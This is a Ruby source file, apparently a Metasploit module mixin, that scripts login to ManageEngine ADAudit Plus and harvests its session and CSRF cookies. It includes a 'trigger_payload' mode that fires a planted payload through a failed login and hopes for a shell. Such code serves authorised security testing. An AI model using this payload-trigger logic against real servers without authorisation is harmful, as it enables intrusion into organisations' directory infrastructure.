# -*- coding: binary -*-
module Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::Login
  include Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::TargetInfo
  include Msf::Exploit::Remote::HTTP::ManageengineAdauditPlus::URIs

  # Performs a ManageEngine ADAudit Plus login.
  #
  # @param mode [String] A string denoting the mode this function should be run in. Can be standard_auth for standard authorization, trigger_payload for when we are triggering a payload, or silent to reduce output.
  # @param auth_domain [String] The authentication domain to use to log in.
  # @param user [String] The username to log in as.
  # @param pass [String] The password to log in with.
  # @return [Array] Array containing a a status code (Integer) and a status message (String). If login succeeds, will also contain a cookie (String), and an Array of configured domains as Strings as the third and fourth parameters respectively.
  def adaudit_plus_login(mode, auth_domain, user='', pass='')
    cookie_jar.clear # let's start fresh
    if mode == 'trigger_payload'
      print_status("Attempting to trigger the payload via an authentication attempt for domain #{@domain_alias} using incorrect credentials.")
      trigger_attempt_fail_message = " You can try to manually trigger the payload via a failed login attempt for the #{@domain_alias} domain."
    else
      trigger_attempt_fail_message = ''
    end

    # Visit the default homepage to retrieve some of the baseline cookies needed to authenticate.
    res_initial_cookies = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_initial_cookies
      return [adaudit_plus_status::CONNECTION_FAILED, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_initial_cookies.code == 200 && res_initial_cookies.headers.include?('Set-Cookie')
      return [adaudit_plus_status::UNEXPECTED_REPLY, "Failed to obtain the baseline cookies needed to proceed with authentication.#{trigger_attempt_fail_message}"]
    end

    # Visit the adaudit_plus_jump_to_js_uri page to grab more cookies needed for authentication.
    unless mode == 'silent'
      vprint_status('Attempting to obtain the required cookies for authentication')
    end

    res_extra_cookies = send_request_cgi({
      'uri' => adaudit_plus_jump_to_js_uri,
      'method' => 'GET',
      'keep_cookies' => true
    })

    unless res_extra_cookies
      return [adaudit_plus_status::CONNECTION_FAILED, "Connection failed.#{trigger_attempt_fail_message}"]
    end

    unless res_extra_cookies.code == 200 && res_extra_cookies.headers.include?('Set-Cookie') && res_extra_cookies.get_cookies =~ /adapcsrf=[a-z0-9]{128}/
      return [adaudit_plus_status::UNEXPECTED_REPLY, "Failed to obtain the jump_to_js cookies required for authentication.#{trigger_attempt_fail_message}"]
    end

    case mode
    when 'standard_auth'
      print_status('Trying to authenticate...')
    when 'trigger_payload'
      vprint_status('Trying to authenticate...')
    end

    post_vars = {
      'forChecking' => '',
      'j_username' => user.to_s,
      'j_password' => pass.to_s,
      'domainName' => auth_domain.to_s,
      'AUTHRULE_NAME' => 'Authenticator'
    }

    res_login = send_request_cgi({
      'uri' => adaudit_plus_login_uri,
      'method' => 'POST',
      'keep_cookies' => true,
      'vars_post' => post_vars
    })

    # Check to see if the connection succeeded.
    return [adaudit_plus_status::CONNECTION_FAILED, 'Connection failed'] unless res_login

    if mode == 'trigger_payload'
      # If we're only here to trigger the payload, we should only verify the response code and HTTP title.
      if res_login
        if res_login.code == 200 && res_login.body =~ /<title>ADAudit Plus/
          print_status("Trigger attempt completed. Let's hope we get a shell...")
        else
          print_warning('Received unexpected reply after sending the trigger request. Exploitation may not work.')
        end
      else
        print_error('Connection failed while trying to trigger the payload, exploitation most likely failed.')
        print_error(trigger_attempt_fail_message)
      end

      # We don't need to return a message or cookie here so let's set these to empty strings.
      return [adaudit_plus_status::SUCCESS, '', '']
    end

    # Check to see if we got the right response code if the mode was not trigger_payload.
    unless res_login.code == 303 && res_login.headers.include?('Set-Cookie')
      return [adaudit_plus_status::NO_ACCESS, 'Failed to authenticate.']
    end

    # Check if we are actually logged in by visiting the home page.
    res_post_auth = send_request_cgi({
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'keep_cookies' => true
    })

    return [adaudit_plus_status::CONNECTION_FAILED, 'Connection failed'] unless res_post_auth

    unless res_post_auth.code == 200 && res_post_auth.body.include?('ManageEngine ADAudit Plus web client is initializing')
      return [adaudit_plus_status::NO_ACCESS, 'The web app failed to load after authenticating']
    end

    # Return the value of the adapcsrf cookie, which will be required for later actions.
    adapcsrf_cookie = cookie_jar.cookies.select { |k| k.name == 'adapcsrf' }&.first
    if adapcsrf_cookie.blank? || adapcsrf_cookie.value.blank?
      return [adaudit_plus_status::NO_ACCESS, 'Failed to obtain the required adapcsrf cookie']
    end

    # In order to get a cookie we can actually use, we need to obtain the configured domains via the API,
    # so we will call adaudit_plus_grab_configured_domains to retreive this information for us.
    # Note that adaudit_plus_obtain_configured_domains uses the same return format as this method.
    adaudit_plus_grab_configured_domains(adapcsrf_cookie.value, mode)
  end
end
